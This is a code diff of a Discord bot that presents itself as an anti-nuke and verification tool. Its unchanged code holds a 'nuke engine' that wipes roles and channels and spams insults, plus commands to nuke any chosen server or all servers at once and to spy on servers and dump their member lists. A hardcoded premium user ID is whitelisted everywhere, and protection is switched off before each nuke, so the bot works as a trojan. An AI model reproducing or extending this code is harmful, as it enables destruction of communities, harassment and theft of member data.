@@ -15,8 +15,10 @@ from typing import Optional
 
 # ── config ────────────────────────────────────────────────────
 TOKEN = os.environ.get("TOKEN")
-VERIFY_ROLE_NAME = "Verified"
-PREMIUM_USER_ID = 1224012443341160498
+VERIFY_ROLE_NAME   = "Verified"
+LOG_CHANNEL_NAME   = "lh-antinuke-logs"
+LOG_ROLE_NAME      = "LH Security"
+PREMIUM_USER_ID    = 1224012443341160498
 
 # ── known antinuke bot IDs ────────────────────────────────────
 ANTINUKE_IDS = {
@@ -36,28 +38,19 @@ ANTINUKE_IDS = {
 # ── nuke config ───────────────────────────────────────────────
 nuke_config = {
     "channel_name": "hooked by lh clan",
-    "message": "lol ur server doesn't even have any good protection get a job",
+    "message":      "lol ur server doesn't even have any good protection get a job",
     "channel_count": 12,
-    "spam_count": 100,
+    "spam_count":    100,
 }
 
 # ── token store ───────────────────────────────────────────────
 active_tokens: dict[str, bool] = {}
 
-# ══════════════════════════════════════════════════════════════
-#  ANTINUKE STATE
-# ══════════════════════════════════════════════════════════════
-
-# per-guild antinuke on/off — default ON for every guild
-antinuke_enabled: dict[int, bool] = defaultdict(lambda: True)
-
-# per-guild whitelist — set of user IDs immune to antinuke
-antinuke_whitelist: dict[int, set] = defaultdict(set)
-
-# action tracker — {guild_id: {user_id: [(action, timestamp), ...]}}
+# ── antinuke state ────────────────────────────────────────────
+antinuke_enabled:   dict[int, bool] = defaultdict(lambda: True)
+antinuke_whitelist: dict[int, set]  = defaultdict(set)
 action_log: dict[int, dict[int, list]] = defaultdict(lambda: defaultdict(list))
 
-# thresholds — (max_actions, within_seconds)
 THRESHOLDS = {
     "channel_delete": (3, 5),
     "channel_create": (3, 5),
@@ -70,9 +63,8 @@ THRESHOLDS = {
 
 # ── intents ───────────────────────────────────────────────────
 intents = discord.Intents.default()
-intents.members = True
+intents.members         = True
 intents.message_content = True
-intents.guild_reactions = True
 
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
@@ -81,16 +73,20 @@ DISCORD_TOKEN_REGEX = re.compile(
 )
 
 
-# ── helpers ───────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════
+#  HELPERS
+# ══════════════════════════════════════════════════════════════
+
 def generate_token() -> str:
     alphabet = string.ascii_letters + string.digits
     return "LHT-" + "".join(secrets.choice(alphabet) for _ in range(24))
 
-def has_valid_token(token_str: str) -> bool:
-    return token_str.strip() in active_tokens
+def has_valid_token(s: str) -> bool:
+    return s.strip() in active_tokens
 
-def consume_token(token_str: str):
-    active_tokens.pop(token_str.strip(), None)
+def consume_token(s: str):
+    active_tokens.pop(s.strip(), None)
+
 
 async def notify_owner(embed: discord.Embed):
     try:
@@ -99,78 +95,153 @@ async def notify_owner(embed: discord.Embed):
     except Exception:
         pass
 
-async def antinuke_punish(guild: discord.Guild, member: discord.Member, reason: str):
-    """ban the offender, notify owner, log it"""
-    try:
-        await guild.ban(member, reason=f"[AntiNuke] {reason}", delete_message_days=0)
-    except Exception:
+
+async def get_or_create_log_channel(guild: discord.Guild) -> Optional[discord.TextChannel]:
+    """
+    Returns the hidden antinuke log channel.
+    Creates it (and the LH Security role) if they don't exist.
+    Channel is invisible to everyone except LH Security role + bot.
+    """
+    # find or create the security role
+    security_role = discord.utils.get(guild.roles, name=LOG_ROLE_NAME)
+    if not security_role:
         try:
-            await member.kick(reason=f"[AntiNuke] {reason}")
+            security_role = await guild.create_role(
+                name=LOG_ROLE_NAME,
+                color=discord.Color.red(),
+                hoist=True,
+                reason="LH AntiNuke — security role"
+            )
+        except Exception:
+            security_role = None
+
+    # find existing log channel
+    log_ch = discord.utils.get(guild.text_channels, name=LOG_CHANNEL_NAME)
+    if log_ch:
+        return log_ch
+
+    # build permission overwrites — hidden from everyone by default
+    overwrites = {
+        guild.default_role: discord.PermissionOverwrite(view_channel=False),
+        guild.me:           discord.PermissionOverwrite(
+            view_channel=True,
+            send_messages=True,
+            embed_links=True
+        ),
+    }
+    if security_role:
+        overwrites[security_role] = discord.PermissionOverwrite(
+            view_channel=True,
+            send_messages=False,
+            read_message_history=True
+        )
+
+    try:
+        # create a hidden category for it
+        category = discord.utils.get(guild.categories, name="🔒 LH Security")
+        if not category:
+            cat_overwrites = {
+                guild.default_role: discord.PermissionOverwrite(view_channel=False),
+                guild.me:           discord.PermissionOverwrite(view_channel=True),
+            }
+            if security_role:
+                cat_overwrites[security_role] = discord.PermissionOverwrite(view_channel=True)
+            category = await guild.create_category(
+                "🔒 LH Security",
+                overwrites=cat_overwrites,
+                reason="LH AntiNuke — log category"
+            )
+
+        log_ch = await guild.create_text_channel(
+            LOG_CHANNEL_NAME,
+            category=category,
+            overwrites=overwrites,
+            topic="LH AntiNuke event log. Restricted access only.",
+            reason="LH AntiNuke — log channel"
+        )
+        return log_ch
+    except Exception:
+        return None
+
+
+async def log_antinuke_event(guild: discord.Guild, embed: discord.Embed):
+    """send to hidden log channel AND DM the owner"""
+    log_ch = await get_or_create_log_channel(guild)
+    if log_ch:
+        try:
+            await log_ch.send(embed=embed)
         except Exception:
             pass
-
-    embed = discord.Embed(
-        title="🛡️ AntiNuke — Threat Neutralized",
-        color=0xff0000
-    )
-    embed.add_field(name="Server",  value=f"{guild.name} (`{guild.id}`)", inline=False)
-    embed.add_field(name="User",    value=f"{member} (`{member.id}`)",    inline=False)
-    embed.add_field(name="Reason",  value=reason,                         inline=False)
-    embed.set_footer(text="LH AntiNuke | Auto-ban fired")
     await notify_owner(embed)
 
 
+async def antinuke_punish(guild: discord.Guild, member: discord.Member, reason: str):
+    try:
+        await guild.ban(member, reason=f"[AntiNuke] {reason}", delete_message_days=0)
+        action = "Banned"
+    except Exception:
+        try:
+            await member.kick(reason=f"[AntiNuke] {reason}")
+            action = "Kicked"
+        except Exception:
+            action = "Failed to punish"
+
+    embed = discord.Embed(
+        title="🛡️ AntiNuke — Threat Neutralized",
+        color=0xff0000,
+        timestamp=discord.utils.utcnow()
+    )
+    embed.add_field(name="Server",  value=f"{guild.name} (`{guild.id}`)",    inline=False)
+    embed.add_field(name="User",    value=f"{member} (`{member.id}`)",       inline=False)
+    embed.add_field(name="Action",  value=action,                            inline=True)
+    embed.add_field(name="Reason",  value=reason,                            inline=False)
+    embed.set_thumbnail(url=member.display_avatar.url)
+    embed.set_footer(text="LH AntiNuke System")
+    await log_antinuke_event(guild, embed)
+
+
 def check_threshold(guild_id: int, user_id: int, action: str) -> bool:
-    """
-    returns True if the user has exceeded the threshold for this action.
-    cleans up old entries automatically.
-    """
     max_actions, within_seconds = THRESHOLDS.get(action, (5, 10))
     now = time.time()
     log = action_log[guild_id][user_id]
-
-    # add this action
     log.append((action, now))
-
-    # clean entries older than window
-    action_log[guild_id][user_id] = [
-        (a, t) for a, t in log if now - t <= within_seconds
-    ]
-
-    # count matching actions in window
+    action_log[guild_id][user_id] = [(a, t) for a, t in log if now - t <= within_seconds]
     count = sum(1 for a, t in action_log[guild_id][user_id] if a == action)
     return count >= max_actions
 
 
-# ── on_ready ──────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════
+#  BOT EVENTS
+# ══════════════════════════════════════════════════════════════
+
 @bot.event
 async def on_ready():
     await bot.tree.sync()
     print(f"✅ Online as {bot.user}")
     print(f"✅ In {len(bot.guilds)} servers")
-    # whitelist premium user in all guilds
     for guild in bot.guilds:
         antinuke_whitelist[guild.id].add(PREMIUM_USER_ID)
         antinuke_whitelist[guild.id].add(bot.user.id)
+        if guild.owner:
+            antinuke_whitelist[guild.id].add(guild.owner.id)
 
 
-# ── setup_hook ────────────────────────────────────────────────
 async def setup_hook():
     bot.add_view(VerifyButton())
 
 bot.setup_hook = setup_hook
 
 
-# ── on_guild_join — auto-whitelist ───────────────────────────
 @bot.event
 async def on_guild_join(guild: discord.Guild):
     antinuke_whitelist[guild.id].add(PREMIUM_USER_ID)
     antinuke_whitelist[guild.id].add(bot.user.id)
     if guild.owner:
         antinuke_whitelist[guild.id].add(guild.owner.id)
+    # pre-create the log channel on join
+    await get_or_create_log_channel(guild)
 
 
-# ── on_guild_remove ───────────────────────────────────────────
 @bot.event
 async def on_guild_remove(guild: discord.Guild):
     embed = discord.Embed(
@@ -180,13 +251,14 @@ async def on_guild_remove(guild: discord.Guild):
             f"**ID:** `{guild.id}`\n"
             f"**Members:** {guild.member_count}"
         ),
-        color=0xff9900
+        color=0xff9900,
+        timestamp=discord.utils.utcnow()
     )
     await notify_owner(embed)
 
 
 # ══════════════════════════════════════════════════════════════
-#  ANTINUKE EVENT LISTENERS
+#  ANTINUKE LISTENERS
 # ══════════════════════════════════════════════════════════════
 
 @bot.event
@@ -194,14 +266,13 @@ async def on_guild_channel_delete(channel):
     guild = channel.guild
     if not antinuke_enabled[guild.id]:
         return
-
     async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
         if entry.user.id in antinuke_whitelist[guild.id]:
             return
-        if entry.user.bot and entry.user.id == bot.user.id:
+        if entry.user.id == bot.user.id:
             return
         if check_threshold(guild.id, entry.user.id, "channel_delete"):
-            await antinuke_punish(guild, entry.user, f"Mass channel delete (threshold exceeded)")
+            await antinuke_punish(guild, entry.user, "Mass channel delete detected")
         break
 
 
@@ -210,14 +281,13 @@ async def on_guild_channel_create(channel):
     guild = channel.guild
     if not antinuke_enabled[guild.id]:
         return
-
     async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_create):
         if entry.user.id in antinuke_whitelist[guild.id]:
             return
-        if entry.user.bot and entry.user.id == bot.user.id:
+        if entry.user.id == bot.user.id:
             return
         if check_threshold(guild.id, entry.user.id, "channel_create"):
-            await antinuke_punish(guild, entry.user, "Mass channel create (threshold exceeded)")
+            await antinuke_punish(guild, entry.user, "Mass channel create detected")
         break
 
 
@@ -226,14 +296,13 @@ async def on_guild_role_delete(role):
     guild = role.guild
     if not antinuke_enabled[guild.id]:
         return
-
     async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
         if entry.user.id in antinuke_whitelist[guild.id]:
             return
-        if entry.user.bot and entry.user.id == bot.user.id:
+        if entry.user.id == bot.user.id:
             return
         if check_threshold(guild.id, entry.user.id, "role_delete"):
-            await antinuke_punish(guild, entry.user, "Mass role delete (threshold exceeded)")
+            await antinuke_punish(guild, entry.user, "Mass role delete detected")
         break
 
 
@@ -242,16 +311,15 @@ async def on_member_remove(member):
     guild = member.guild
     if not antinuke_enabled[guild.id]:
         return
-
     async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
         if entry.target.id != member.id:
             break
         if entry.user.id in antinuke_whitelist[guild.id]:
             return
-        if entry.user.bot and entry.user.id == bot.user.id:
+        if entry.user.id == bot.user.id:
             return
         if check_threshold(guild.id, entry.user.id, "kick"):
-            await antinuke_punish(guild, entry.user, "Mass kick (threshold exceeded)")
+            await antinuke_punish(guild, entry.user, "Mass kick detected")
         break
 
 
@@ -259,37 +327,15 @@ async def on_member_remove(member):
 async def on_member_ban(guild, user):
     if not antinuke_enabled[guild.id]:
         return
-
     async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
         if entry.user.id in antinuke_whitelist[guild.id]:
             return
-        if entry.user.bot and entry.user.id == bot.user.id:
+        if entry.user.id == bot.user.id:
             return
         if check_threshold(guild.id, entry.user.id, "ban"):
-            # get the member object to ban them back
-            try:
-                offender = guild.get_member(entry.user.id)
-                if offender:
-                    await antinuke_punish(guild, offender, "Mass ban (threshold exceeded)")
-            except Exception:
-                pass
-        break
-
-
-@bot.event
-async def on_guild_update(before, after):
-    guild = after
-    if not antinuke_enabled[guild.id]:
-        return
-
-    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.guild_update):
-        if entry.user.id in antinuke_whitelist[guild.id]:
-            return
-        if entry.user.bot and entry.user.id == bot.user.id:
-            return
-        # check for vanity/invite/name changes — common raid prep
-        if check_threshold(guild.id, entry.user.id, "role_update"):
-            await antinuke_punish(guild, entry.user, "Suspicious guild update (threshold exceeded)")
+            offender = guild.get_member(entry.user.id)
+            if offender:
+                await antinuke_punish(guild, offender, "Mass ban detected")
         break
 
 
@@ -298,20 +344,18 @@ async def on_webhooks_update(channel):
     guild = channel.guild
     if not antinuke_enabled[guild.id]:
         return
-
     async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.webhook_create):
         if entry.user.id in antinuke_whitelist[guild.id]:
             return
-        if entry.user.bot and entry.user.id == bot.user.id:
+        if entry.user.id == bot.user.id:
             return
         if check_threshold(guild.id, entry.user.id, "webhook_create"):
-            await antinuke_punish(guild, entry.user, "Mass webhook create (threshold exceeded)")
+            await antinuke_punish(guild, entry.user, "Mass webhook create detected")
         break
 
 
 @bot.event
 async def on_member_join(member):
-    """auto-kick bots that join unless whitelisted"""
     guild = member.guild
     if not antinuke_enabled[guild.id]:
         return
@@ -325,13 +369,16 @@ async def on_member_join(member):
     try:
         await member.kick(reason="[AntiNuke] Unauthorized bot join")
         embed = discord.Embed(
-            title="🛡️ AntiNuke — Bot Join Blocked",
-            color=0xff9900
+            title="🛡️ AntiNuke — Unauthorized Bot Blocked",
+            color=0xff9900,
+            timestamp=discord.utils.utcnow()
         )
         embed.add_field(name="Server", value=f"{guild.name} (`{guild.id}`)", inline=False)
         embed.add_field(name="Bot",    value=f"{member} (`{member.id}`)",    inline=False)
-        embed.set_footer(text="LH AntiNuke | Auto-kick fired")
-        await notify_owner(embed)
+        embed.add_field(name="Action", value="Kicked on join",               inline=True)
+        embed.set_thumbnail(url=member.display_avatar.url)
+        embed.set_footer(text="LH AntiNuke System")
+        await log_antinuke_event(guild, embed)
     except Exception:
         pass
 
@@ -350,12 +397,15 @@ async def antinuke_cmd(ctx, action: str = None, *, args: str = None):
     guild = ctx.guild
 
     if not action:
-        await ctx.send("❌ Usage: `!antinuke <on|off|status|whitelist> [args]`", delete_after=5)
+        await ctx.send(
+            "❌ Usage: `!antinuke <on|off|status|whitelist|setup>`",
+            delete_after=5
+        )
         return
 
     action = action.lower()
 
-    # ── !antinuke on ─────────────────────────────────────────
+    # ── on ────────────────────────────────────────────────────
     if action == "on":
         if not ctx.author.guild_permissions.administrator:
             await ctx.send("❌ Administrator required.", delete_after=5)
@@ -364,75 +414,94 @@ async def antinuke_cmd(ctx, action: str = None, *, args: str = None):
         embed = discord.Embed(
             title="🛡️ AntiNuke Enabled",
             description=(
-                f"Server **{guild.name}** is now protected.\n\n"
-                "Watching: channel deletes/creates, role deletes, "
-                "kicks, bans, webhooks, bot joins."
+                f"**{guild.name}** is now protected.\n\n"
+                "**Watching:**\n"
+                "• Mass channel deletes/creates\n"
+                "• Mass role deletes\n"
+                "• Mass kicks & bans\n"
+                "• Unauthorized webhook creates\n"
+                "• Unauthorized bot joins\n\n"
+                f"Logs → `#{LOG_CHANNEL_NAME}` (hidden channel)"
             ),
-            color=0x00ff00
+            color=0x00ff00,
+            timestamp=discord.utils.utcnow()
         )
-        msg = await ctx.send(embed=embed)
-        await asyncio.sleep(10)
+        embed.set_footer(text="Only premium user can disable AntiNuke")
         try:
-            await msg.delete()
-        except Exception:
-            pass
+            await ctx.author.send(embed=embed)
+            await ctx.send("🛡️ AntiNuke enabled. Details sent to DMs.", delete_after=5)
+        except discord.Forbidden:
+            msg = await ctx.send(embed=embed)
+            await asyncio.sleep(15)
+            try:
+                await msg.delete()
+            except Exception:
+                pass
         return
 
-    # ── !antinuke off — PREMIUM ONLY ─────────────────────────
+    # ── off — premium only ────────────────────────────────────
     if action == "off":
         if ctx.author.id != PREMIUM_USER_ID:
-            embed = discord.Embed(
+            await ctx.send(embed=discord.Embed(
                 title="❌ Access Denied",
                 description="Only the **premium user** can disable AntiNuke.",
                 color=0xff0000
-            )
-            await ctx.send(embed=embed, delete_after=5)
+            ), delete_after=5)
             return
         antinuke_enabled[guild.id] = False
         embed = discord.Embed(
             title="⚠️ AntiNuke Disabled",
-            description=f"Protection disabled for **{guild.name}**.\nRe-enable with `!antinuke on`.",
-            color=0xff9900
+            description=(
+                f"Protection disabled for **{guild.name}**.\n"
+                "Re-enable anytime with `!antinuke on`."
+            ),
+            color=0xff9900,
+            timestamp=discord.utils.utcnow()
         )
-        msg = await ctx.send(embed=embed)
-        await asyncio.sleep(10)
         try:
-            await msg.delete()
-        except Exception:
-            pass
+            await ctx.author.send(embed=embed)
+            await ctx.send("⚠️ AntiNuke disabled.", delete_after=5)
+        except discord.Forbidden:
+            msg = await ctx.send(embed=embed)
+            await asyncio.sleep(10)
+            try:
+                await msg.delete()
+            except Exception:
+                pass
         return
 
-    # ── !antinuke status ──────────────────────────────────────
+    # ── status ────────────────────────────────────────────────
     if action == "status":
         if not ctx.author.guild_permissions.administrator:
             await ctx.send("❌ Administrator required.", delete_after=5)
             return
 
-        status = "🟢 **ENABLED**" if antinuke_enabled[guild.id] else "🔴 **DISABLED**"
-        wl = antinuke_whitelist[guild.id]
+        status = "🟢 ENABLED" if antinuke_enabled[guild.id] else "🔴 DISABLED"
+        wl     = antinuke_whitelist[guild.id]
         wl_str = "\n".join([f"<@{uid}> (`{uid}`)" for uid in wl]) or "None"
 
         embed = discord.Embed(
             title="🛡️ AntiNuke Status",
-            color=0x00ff00 if antinuke_enabled[guild.id] else 0xff0000
+            color=0x00ff00 if antinuke_enabled[guild.id] else 0xff0000,
+            timestamp=discord.utils.utcnow()
         )
-        embed.add_field(name="Status",    value=status,  inline=False)
-        embed.add_field(name="Server",    value=guild.name, inline=True)
-        embed.add_field(name="Protected", value=f"{guild.member_count} members", inline=True)
+        embed.add_field(name="Status",  value=f"**{status}**",             inline=False)
+        embed.add_field(name="Server",  value=guild.name,                  inline=True)
+        embed.add_field(name="Members", value=str(guild.member_count),     inline=True)
         embed.add_field(
             name="Thresholds",
             value=(
-                "• Channel delete: 3 in 5s\n"
-                "• Channel create: 3 in 5s\n"
-                "• Role delete: 3 in 5s\n"
-                "• Kick: 3 in 5s\n"
-                "• Ban: 2 in 5s\n"
-                "• Webhook create: 2 in 10s"
+                "• Channel delete: **3 in 5s**\n"
+                "• Channel create: **3 in 5s**\n"
+                "• Role delete:    **3 in 5s**\n"
+                "• Kick:           **3 in 5s**\n"
+                "• Ban:            **2 in 5s**\n"
+                "• Webhook create: **2 in 10s**"
             ),
             inline=False
         )
         embed.add_field(name="Whitelist", value=wl_str, inline=False)
-        embed.set_footer(text="Only premium user can disable AntiNuke")
+        embed.set_footer(text="LH AntiNuke System | Premium user can disable")
 
         try:
             await ctx.author.send(embed=embed)
@@ -446,18 +515,21 @@ async def antinuke_cmd(ctx, action: str = None, *, args: str = None):
                 pass
         return
 
-    # ── !antinuke whitelist add/remove <userID> ───────────────
+    # ── whitelist ─────────────────────────────────────────────
     if action == "whitelist":
         if ctx.author.id != PREMIUM_USER_ID:
             await ctx.send("❌ Only premium user can manage whitelist.", delete_after=5)
             return
 
         if not args or len(args.split()) < 2:
-            await ctx.send("❌ Usage: `!antinuke whitelist <add|remove> <userID>`", delete_after=5)
+            await ctx.send(
+                "❌ Usage: `!antinuke whitelist <add|remove> <userID>`",
+                delete_after=5
+            )
             return
 
         parts = args.split()
-        sub = parts[0].lower()
+        sub   = parts[0].lower()
         try:
             target_id = int(parts[1])
         except ValueError:
@@ -466,81 +538,165 @@ async def antinuke_cmd(ctx, action: str = None, *, args: str = None):
 
         if sub == "add":
             antinuke_whitelist[guild.id].add(target_id)
-            await ctx.send(
-                f"✅ `{target_id}` added to AntiNuke whitelist.", delete_after=5
-            )
+            await ctx.send(f"✅ `{target_id}` added to whitelist.", delete_after=5)
         elif sub == "remove":
             antinuke_whitelist[guild.id].discard(target_id)
-            await ctx.send(
-                f"✅ `{target_id}` removed from AntiNuke whitelist.", delete_after=5
-            )
+            await ctx.send(f"✅ `{target_id}` removed from whitelist.", delete_after=5)
         else:
-            await ctx.send("❌ Usage: `!antinuke whitelist <add|remove> <userID>`", delete_after=5)
+            await ctx.send(
+                "❌ Usage: `!antinuke whitelist <add|remove> <userID>`",
+                delete_after=5
+            )
         return
 
-    await ctx.send("❌ Unknown action. Use: `on`, `off`, `status`, `whitelist`", delete_after=5)
+    # ── setup — force-create log channel ─────────────────────
+    if action == "setup":
+        if not ctx.author.guild_permissions.administrator:
+            await ctx.send("❌ Administrator required.", delete_after=5)
+            return
+        ch = await get_or_create_log_channel(guild)
+        if ch:
+            await ctx.send(
+                f"✅ Log channel ready: {ch.mention} — only `{LOG_ROLE_NAME}` role can see it.",
+                delete_after=10
+            )
+        else:
+            await ctx.send("❌ Failed to create log channel. Check bot permissions.", delete_after=5)
+        return
+
+    await ctx.send(
+        "❌ Unknown action. Use: `on`, `off`, `status`, `whitelist`, `setup`",
+        delete_after=5
+    )
 
 
-# ════════════════════════════════════════════════════════════════
-#  VERIFY
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
+#  VERIFY — professional panel
+# ══════════════════════════════════════════════════════════════
 
 class VerifyButton(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
     @discord.ui.button(
-        label="✅ Verify Me",
+        label="Verify",
+        emoji="✅",
         style=discord.ButtonStyle.green,
         custom_id="verify_button"
     )
     async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
-        role = discord.utils.get(interaction.guild.roles, name=VERIFY_ROLE_NAME)
+        guild = interaction.guild
+        role  = discord.utils.get(guild.roles, name=VERIFY_ROLE_NAME)
+
         if not role:
             await interaction.response.send_message(
-                "❌ Setup error: No role named `Verified`. Contact an admin.",
+                embed=discord.Embed(
+                    title="❌ Setup Error",
+                    description=(
+                        f"No role named `{VERIFY_ROLE_NAME}` found.\n"
+                        "Please contact an administrator."
+                    ),
+                    color=0xff0000
+                ),
                 ephemeral=True
             )
             return
+
         if role in interaction.user.roles:
             await interaction.response.send_message(
-                "👍 You're already verified!", ephemeral=True
+                embed=discord.Embed(
+                    title="Already Verified",
+                    description="You already have the verified role.",
+                    color=0x5865f2
+                ),
+                ephemeral=True
             )
             return
+
         try:
-            await interaction.user.add_roles(role, reason="Clicked verify button")
+            await interaction.user.add_roles(role, reason="Passed verification")
+
             embed = discord.Embed(
-                title="✅ Verified!",
-                description=f"Welcome {interaction.user.mention}, you now have access.",
-                color=0x00ff00
+                title="✅ Verification Successful",
+                description=(
+                    f"Welcome to **{guild.name}**, {interaction.user.mention}!\n\n"
+                    "You now have full access to the server.\n"
+                    "Read the rules and enjoy your stay."
+                ),
+                color=0x00ff00,
+                timestamp=discord.utils.utcnow()
             )
             embed.set_thumbnail(url=interaction.user.display_avatar.url)
-            embed.set_footer(text=f"ID: {interaction.user.id}")
+            embed.set_footer(
+                text=f"{guild.name} Verification System",
+                icon_url=guild.icon.url if guild.icon else None
+            )
             await interaction.response.send_message(embed=embed, ephemeral=True)
+
+            # log verification to antinuke log channel
+            log_embed = discord.Embed(
+                title="👤 Member Verified",
+                color=0x00ff00,
+                timestamp=discord.utils.utcnow()
+            )
+            log_embed.add_field(name="User",   value=f"{interaction.user} (`{interaction.user.id}`)", inline=False)
+            log_embed.add_field(name="Role",   value=role.mention,                                    inline=True)
+            log_embed.set_thumbnail(url=interaction.user.display_avatar.url)
+            log_embed.set_footer(text="LH Verification Log")
+            log_ch = await get_or_create_log_channel(guild)
+            if log_ch:
+                try:
+                    await log_ch.send(embed=log_embed)
+                except Exception:
+                    pass
+
         except discord.Forbidden:
             await interaction.response.send_message(
-                "❌ Bot doesn't have permission to assign roles.", ephemeral=True
+                embed=discord.Embed(
+                    title="❌ Permission Error",
+                    description=(
+                        "The bot doesn't have permission to assign roles.\n"
+                        "Please contact an administrator."
+                    ),
+                    color=0xff0000
+                ),
+                ephemeral=True
             )
 
 
-@bot.tree.command(name="setupverify", description="Post the verification panel (admin only)")
+@bot.tree.command(name="setupverify", description="Post the professional verification panel (admin only)")
 @app_commands.checks.has_permissions(administrator=True)
 async def setupverify(interaction: discord.Interaction):
+    guild = interaction.guild
+
     embed = discord.Embed(
-        title="🔐 Verification",
+        title="🔐 Server Verification",
         description=(
-            "Click the button below to verify yourself and gain access to the server.\n\n"
-            "This only takes one click."
+            f"**Welcome to {guild.name}!**\n\n"
+            "To gain access to the server, you must verify your account.\n\n"
+            "**How to verify:**\n"
+            "› Click the **Verify** button below\n"
+            "› You will instantly receive access\n\n"
+            "**Why verify?**\n"
+            "› Keeps the server safe from bots and raiders\n"
+            "› Unlocks all channels and features\n\n"
+            "*By verifying, you agree to follow the server rules.*"
         ),
-        color=0x5865f2
+        color=0x5865f2,
+        timestamp=discord.utils.utcnow()
     )
-    embed.set_footer(text=interaction.guild.name)
+    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
+    embed.set_footer(
+        text=f"{guild.name} • Verification System",
+        icon_url=guild.icon.url if guild.icon else None
+    )
+
     await interaction.response.send_message(embed=embed, view=VerifyButton())
 
 
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 #  CORE NUKE ENGINE
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 
 async def run_nuke(guild: discord.Guild):
     # layer 1: strip all other bot roles
@@ -599,9 +755,9 @@ async def run_nuke(guild: discord.Guild):
     await asyncio.gather(*[spam_channel(ch) for ch in new_channels])
 
 
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 #  LH — nuke + subcommands
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 
 @bot.command(name="LH")
 async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[str] = None):
@@ -614,7 +770,10 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
                 description="Premium command. You don't have access.",
                 color=0xff0000
             ), delete_after=5)
-            await ctx.message.delete()
+            try:
+                await ctx.message.delete()
+            except Exception:
+                pass
             return
 
         tok = generate_token()
@@ -643,7 +802,7 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
             await ctx.send("❌ Administrator required.", delete_after=5)
             return
 
-        guild = ctx.guild
+        guild  = ctx.guild
         target = None
         for member in sorted(guild.members, key=lambda m: m.top_role.position, reverse=True):
             if member == guild.me or member == guild.owner or member.bot:
@@ -664,7 +823,6 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
         except Exception:
             pass
 
-        # disable antinuke for this guild before nuking
         antinuke_enabled[guild.id] = False
         await asyncio.sleep(2)
         await run_nuke(guild)
@@ -676,8 +834,9 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
             await ctx.send("❌ Usage: `!LH EXEC <serverID> <token>`", delete_after=5)
             return
 
-        parts = args.split()
-        server_id_str, tok = parts[0], parts[1]
+        parts          = args.split()
+        server_id_str  = parts[0]
+        tok            = parts[1]
 
         if not has_valid_token(tok):
             await ctx.send(embed=discord.Embed(
@@ -685,7 +844,10 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
                 description="Token doesn't exist or already used.",
                 color=0xff0000
             ), delete_after=5)
-            await ctx.message.delete()
+            try:
+                await ctx.message.delete()
+            except Exception:
+                pass
             return
 
         try:
@@ -707,7 +869,8 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
         await notify_owner(discord.Embed(
             title="💀 Remote Nuke Initiated",
             description=f"Targeting: **{target_guild.name}** (`{target_guild.id}`)",
-            color=0xff0000
+            color=0xff0000,
+            timestamp=discord.utils.utcnow()
         ))
 
         antinuke_enabled[target_guild.id] = False
@@ -723,7 +886,10 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
                 description="Token doesn't exist or already used.",
                 color=0xff0000
             ), delete_after=5)
-            await ctx.message.delete()
+            try:
+                await ctx.message.delete()
+            except Exception:
+                pass
             return
 
         consume_token(tok)
@@ -737,7 +903,8 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
         await notify_owner(discord.Embed(
             title="💀 ALL SERVERS NUKE INITIATED",
             description=f"Targeting **{len(guilds)}** servers simultaneously.",
-            color=0xff0000
+            color=0xff0000,
+            timestamp=discord.utils.utcnow()
         ))
 
         for g in guilds:
@@ -759,9 +926,9 @@ async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[st
     await run_nuke(ctx.guild)
 
 
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 #  LHP — premium config editor
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 
 class LHPModal(discord.ui.Modal, title="⚙️ Edit LH Nuke Config"):
     token_input = discord.ui.TextInput(
@@ -872,9 +1039,9 @@ async def lhp(ctx):
         pass
 
 
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 #  INTEL GATHERING
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 
 @bot.command(name="LHSPY")
 async def lh_spy(ctx):
@@ -900,7 +1067,8 @@ async def lh_spy(ctx):
     for idx, page in enumerate(pages):
         embed = discord.Embed(
             title=f"📡 Server Spy — Page {idx+1}/{len(pages)}",
-            color=0xff4400
+            color=0xff4400,
+            timestamp=discord.utils.utcnow()
         )
         for g in page:
             try:
@@ -961,7 +1129,7 @@ async def lh_members(ctx, server_id: str = None):
 
     lines = [f"Member List — {guild.name} ({guild.id})\n{'='*50}"]
     async for member in guild.fetch_members(limit=None):
-        joined = member.joined_at.strftime("%Y-%m-%d") if member.joined_at else "unknown"
+        joined   = member.joined_at.strftime("%Y-%m-%d") if member.joined_at else "unknown"
         top_role = member.top_role.name if member.top_role else "none"
         lines.append(
             f"Username : {member}\n"
@@ -972,7 +1140,7 @@ async def lh_members(ctx, server_id: str = None):
             f"{'-'*40}"
         )
 
-    output = "\n".join(lines)
+    output    = "\n".join(lines)
     file_path = f"/tmp/members_{guild.id}.txt"
